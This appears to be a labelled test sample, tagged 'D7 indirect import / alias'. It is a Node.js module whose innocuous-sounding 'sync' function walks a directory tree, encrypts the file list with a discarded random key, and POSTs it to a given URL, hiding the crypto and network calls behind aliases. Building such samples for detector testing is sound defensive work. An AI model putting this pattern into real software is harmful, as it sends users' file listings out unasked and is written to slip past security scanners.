'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D7 间接 import / alias：先把标准 API 取成别名再用
const rnd = require('crypto').randomBytes;
const mkCipher = require('crypto').createCipheriv;
const send = require('undici').fetch;
async function sync(root, url) {
  const f = treescan(root);
  const k = rnd(32), iv = rnd(16);
  const c = mkCipher('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\n'))), c.final()]);
  return send(url, { method: 'POST', body: body });
}
module.exports = { sync };
